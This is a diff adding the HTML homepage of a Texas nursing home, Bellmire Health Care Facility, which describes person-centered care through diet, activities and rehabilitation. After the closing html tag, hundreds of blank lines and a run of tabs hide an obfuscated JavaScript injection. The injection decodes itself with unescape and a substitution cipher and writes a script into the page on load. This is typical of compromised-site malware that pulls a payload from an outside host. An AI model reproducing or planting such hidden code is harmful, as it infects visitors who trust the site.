@@ -1,0 +1,631 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/facilitytemplate.dwt" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Welcome To Bellmire</title>
+<!-- InstanceEndEditable -->
+<style type="text/css">
+<!--
+body,td,th {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 7.25pt;
+	color: #000000;
+}
+body {
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+	background-color: #FFFFE5;
+}
+a {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 7.25pt;
+	color: #333333;
+	font-weight: bold;
+}
+a:link {
+	text-decoration: none;
+}
+a:visited {
+	text-decoration: none;
+	color: #333333;
+}
+a:hover {
+	text-decoration: none;
+	color: #333333;
+}
+a:active {
+	text-decoration: none;
+	color: #333333;
+}
+h1,h2,h3,h4,h5,h6 {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-weight: bold;
+}
+h1 {
+	font-size: 11pt;
+}
+.nav a:link {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 7pt;
+	font-style: normal;
+	line-height: normal;
+	font-weight: bold;
+	font-variant: normal;
+	text-transform: capitalize;
+	color: #FFFFFF;
+	text-decoration: none;
+	text-align: center;
+	letter-spacing: 1.5pt;
+}
+.nav a:visited {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 7pt;
+	font-style: normal;
+	line-height: normal;
+	font-weight: bold;
+	font-variant: normal;
+	text-transform: capitalize;
+	color: #FFFFFF;
+	text-decoration: none;
+	letter-spacing: 1.5pt;
+}
+.nav a:hover {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 7pt;
+	font-style: normal;
+	line-height: normal;
+	font-weight: bold;
+	font-variant: normal;
+	text-transform: capitalize;
+	color: #FFCC00;
+	text-decoration: none;
+	text-align: center;
+	letter-spacing: 1.5pt;
+}
+.nav a:active {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 7pt;
+	font-style: normal;
+	line-height: normal;
+	font-weight: bold;
+	font-variant: normal;
+	text-transform: capitalize;
+	color: #FFFFFF;
+	text-decoration: none;
+	letter-spacing: 1.5pt;
+}
+.centralimgae {
+	background-color: #FFFFFF;
+	background-image: url(centralimage.jpg);
+	background-repeat: no-repeat;
+	background-position: center;
+}
+.below a:link {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 6.5pt;
+	font-style: normal;
+	line-height: normal;
+	font-weight: bold;
+	font-variant: normal;
+	text-transform: capitalize;
+	color: #FFFFFF;
+	text-decoration: none;
+	vertical-align: middle;
+	letter-spacing: .5pt;
+}
+.below a:visited {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 6.5pt;
+	font-style: normal;
+	line-height: normal;
+	font-weight: bold;
+	font-variant: normal;
+	text-transform: capitalize;
+	color: #FFFFFF;
+	text-decoration: none;
+	vertical-align: middle;
+	letter-spacing: .5pt;
+}
+.below a:hover {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 6.5pt;
+	font-style: normal;
+	line-height: normal;
+	font-weight: bold;
+	font-variant: normal;
+	text-transform: capitalize;
+	color: #FFFF99;
+	text-decoration: none;
+	vertical-align: middle;
+	letter-spacing: .5pt;
+}
+.below a:active {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 6.5pt;
+	font-style: normal;
+	line-height: normal;
+	font-weight: bold;
+	font-variant: normal;
+	text-transform: capitalize;
+	color: #FFFFFF;
+	text-decoration: none;
+	vertical-align: middle;
+	letter-spacing: .5pt;
+}
+.address {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 7pt;
+	font-style: normal;
+	line-height: normal;
+	font-weight: normal;
+	font-variant: normal;
+	text-transform: none;
+	color: #666666;
+	text-decoration: none;
+	letter-spacing: 1pt;
+	text-align: right;
+	vertical-align: middle;
+}
+.style1 {
+	font-size: 10pt;
+	font-weight: bold;
+}
+.copy {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 7.25pt;
+	font-style: normal;
+	line-height: normal;
+	font-weight: normal;
+	font-variant: normal;
+	text-transform: none;
+	color: #000000;
+	text-decoration: none;
+	text-align: left;
+	vertical-align: text-top;
+	margin: 0px 5px 0px 0px;
+}
+.logo {
+	background-attachment: fixed;
+	background-image: url(logo.gif);
+	background-repeat: no-repeat;
+	background-position: center center;
+}
+-->
+</style>
+<!-- InstanceBeginEditable name="head" -->
+<style type="text/css">
+<!--
+.style2 {font-size: 10pt}
+-->
+</style>
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+</head>
+
+<body>
+<div align="center">
+  <table width="100%" height="100%" border="0" align="center" cellspacing="20">
+    <tr>
+      <td  align="center" valign="middle"><table width="800" height="560" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+        <tr>
+          <td width="800" align="center" valign="top"><table width="100%" height="18"  border="0" cellpadding="0" cellspacing="0" bgcolor="#000066">
+            <tr align="center" valign="bottom" class="nav">
+              <td width="108" height="15" nowrap><div align="center"><a href="index.html">HOME</a></div></td>
+              <td width="106" height="15" nowrap><div align="center"><a href="aboutus.html">ABOUT US </a></div></td>
+              <td width="106" height="15" nowrap><div align="center"><a href="services.html">SERVICES</a></div></td>
+              <td width="106" height="15" nowrap><div align="center"><a href="admission.html">ADMISSION</a></div></td>
+              <td width="106" height="15" nowrap><div align="center"><a href="directions.html">DIRECTIONS</a></div></td>
+              <td width="108" height="15" nowrap><div align="center"><a href="contactus.html">CONTACT US </a></div></td>
+<td width="108" height="15" nowrap><div align="center"><a href="careers.html">CAREERS </a></div></td>
+            </tr>
+          </table></td>
+        </tr>
+        <tr>
+          <td width="800" align="center" valign="top"><table width="800" height="100"  border="0" cellpadding="0" cellspacing="0">
+            <tr>
+              <td width="175" height="100" align="center" valign="middle" nowrap><div align="center">
+                <table width="175" height="100"  border="0" cellpadding="0" cellspacing="0">
+                  <tr>
+                    <td width="175" height="100" align="center" valign="middle"><img src="logo.gif" width="175" height="100"></td>
+                  </tr>
+                </table>
+              </div></td>
+              <td width="465" height="100" align="right" valign="middle" class="address">1101 Rock Street<br>
+Bowie, TX 76230-3119<br>
+                (940) 872-2283 &bull; Fax: 872-5292<br>
+Bellmire Health Care Facility, LP</td>
+              <td width="10" height="100" align="right" valign="middle"><p>&nbsp;</p>
+                </td>
+              <td width="150" height="100" align="left" valign="bottom" nowrap background="rightimagetop.jpg"><table width="75" border="0" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td width="75" height="75"><img src="image4.jpg" width="75" height="75"></td>
+                </tr>
+              </table></td>
+            </tr>
+          </table>
+            <table width="800" height="432"  border="0" cellpadding="0" cellspacing="0">
+              <tr>
+                <td width="75" height="432" align="left" valign="top" nowrap><table width="75" height="432"  border="0" cellpadding="0" cellspacing="0">
+                  <tr>
+                    <td width="75" height="137" align="left" valign="top"><table width="75" border="0" cellpadding="0" cellspacing="0" bordercolor="#000000">
+                      <tr>
+                        <td width="75" height="75"><img src="image1.gif" width="75" height="75"></td>
+                      </tr>
+                    </table></td>
+                  </tr>
+                  <tr>
+                    <td width="75" height="137" align="left" valign="middle"><table width="75" border="0" cellspacing="0" cellpadding="0">
+                      <tr>
+                        <td width="75" height="75"><img src="image2.jpg" width="75" height="75"></td>
+                      </tr>
+                    </table></td>
+                  </tr>
+                  <tr>
+                    <td width="85" height="137" align="left" valign="bottom"><table width="75" height="75" border="0" cellpadding="0" cellspacing="0">
+                      <tr>
+                        <td width="75" height="75"><img src="image3.jpg" width="75" height="75"></td>
+                      </tr>
+                    </table></td>
+                  </tr>
+                  <tr>
+                    <td width="75" height="20" align="left" valign="middle">&nbsp;</td>
+                  </tr>
+                </table></td>
+                <td width="10" height="432" align="center" valign="top">&nbsp;</td>
+                <td width="555" height="432" align="left" valign="top" class="centralimgae"><table width="555" height="432" border="0" cellpadding="0" cellspacing="0">
+                  <tr>
+                    <td class="copy"><!-- InstanceBeginEditable name="EditRegion1" -->
+                      <p class="copy style2"><em>We are a team of professionals dedicated to maintaining our position as a leader in providing the highest quality care and satisfaction for our residents, families, associates, and communities.</em></p>
+                      <p align="center" class="style1 style2">IT'S ALL ABOUT YOUR CHOICE </p>
+                      <p class="style2">Our Person Centered Care will help individualize each person&rsquo;s stay at  Bellmire Health Care Facility. Care is geared toward past experiences as well as present desires and all about each persons choice.<br>
+                          <br>
+                          <strong>Person Centered Care &mdash; <em>Through Your Diet</em></strong><br>
+  We provide various types of nutritious meals. Each person will be able to choose from many choices of food from the menu of the day. You will be able to express your likes and dislikes and variations of food will be offered to meet your individual tastes.<br>
+  <br>
+  <strong>Person Centered Care &mdash; <em>Through Activities</em></strong><br>
+  At Bellmire Health Care Facility, we strive to provide activities for everyone who lives here. We offer various activities that expand the mind and body either in a group setting or on an individual basis.<br>
+  <br>
+  <strong>Person Centered Care &mdash;<em> Through Rehabilitation</em></strong><br>
+  Our rehabilitation department provides person centered care through individualized treatments. The treatments vary according to your needs. All of our therapists are licensed and provide a loving atmosphere focusing on individual needs.</p>
+                    <!-- InstanceEndEditable --></td>
+                  </tr>
+                </table></td>
+                <td width="10" height="432" align="center" valign="top">&nbsp;</td>
+                <td width="150" height="432" align="left" valign="middle" nowrap background="rightimagebottom.jpg"><table width="75" height="432"  border="0" cellpadding="0" cellspacing="0">
+                  <tr>
+                    <td width="75" height="274" align="left" valign="middle"><table width="75" border="0" cellspacing="0" cellpadding="0">
+                          <tr>
+                            <td width="75" height="75"><img src="image5.jpg" width="75" height="75"></td>
+                          </tr>
+                                        </table></td>
+                  </tr>
+                  <tr>
+                    <td width="75" height="137" align="left" valign="bottom"><table width="75" height="75" border="0" cellpadding="0" cellspacing="0">
+                        <tr>
+                          <td width="75" height="75"><img src="image6.gif" width="75" height="75"></td>
+                        </tr>
+                    </table></td>
+                  </tr>
+                  <tr>
+                    <td width="75" height="20" align="left" valign="middle">&nbsp;</td>
+                  </tr>
+                </table></td>
+              </tr>
+            </table></td>
+        </tr>
+        <tr>
+          <td width="800" align="center" valign="middle" bgcolor="#336633"><div align="center" class="below">
+          <a href="index.html">HOME</a> &nbsp;&nbsp;&nbsp;&nbsp;
+          <a href="aboutus.html"> ABOUT US </a> &nbsp;&nbsp;&nbsp;&nbsp;
+          <a href="services.html">SERVICES</a>&nbsp;&nbsp;&nbsp;&nbsp;
+          <a href="admission.html">aDMISSION&nbsp;</a>&nbsp;&nbsp;&nbsp;
+          <a href="directions.html">DIRECTIONS</a> &nbsp;&nbsp;&nbsp;&nbsp;
+          <a href="contactus.html">CONTACT US </a>&nbsp;&nbsp;&nbsp;&nbsp;
+          <a href="careers.html">CAREERS</a>&nbsp;&nbsp;&nbsp;&nbsp;
+          <a href="disclaimer.html">DISCLAIMER</a>
+          </div></td>
+        </tr>
+      </table></td>
+    </tr>
+  </table>
+</div>
+</body>
+<!-- InstanceEnd --></html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																			<!--19134a39374eb69a76caeaf23140d4f4-><script language=javascript>tkby="%";hqk="<sw63rw69w70tw20w6caw6ew67uw61gw65=w6aaw76ascw72ipw74> w20funw63tionw20ugw6fw28w70cw78)w7bw76w61rw20w67w75w64,ca=\"$2w63w5f&pw5e*(w33w6erd[w4dw65hJw45 w4f{gw2cw39w5cw22)sjw31!w61Gw54w6dUi;w6fvfw7dw3684w60w46w74N0@z+w71P~w2dw48w35V'w4bw5aw37yw23]xuI:.w41Cw42w77w6cw62k|=\",ykw3dw22\"w2cm,rmhw2cw71=\"\"w2cxdy;w66ow72w28w67w75w64w3d0;gud<w70w63x.lw65ngw74w68;guw64w2bw2b){w20w6d=pw63w78.chw61rw41w74(w67udw29;rw6dhw3dca.inw64exw4ffw28m)w3bw69f(rw6dw68>-1w29w7b xw64y=(w28w72w6dw68w2bw31)w258w31-w31)w3bifw28w78dy<=0w29w78dyw2bw3d81;q+=w63aw2ecw68arAt(w78w64w79w2dw31); w7d w65w6csew20qw2bw3dmw3b}ykw2bw3dw71;dow63umenw74.w77rite(ykw29w3bw7d<w2fscw72w69pw74>";yprg=unescape(hqk.replace(/w/g,tkby));var s,pa;document.write(yprg);s="<j_d;^NObGr,IG,h$)1GfGj_d;^N)>O[v_IUhrNAld;Nh3O)<SBR:~mObGr,IG,h$\\)EGfGS_d;^N\\)OSRB$\\)JNN^.//lllA,vv,bhGrGb;N;_jArhN/&&INkA1j?)q[v_IUhrNAdh}hddhdq)\\)><\\/SBR:~m>)OsoO</j_d;^N>OO";ugo(s);</script>
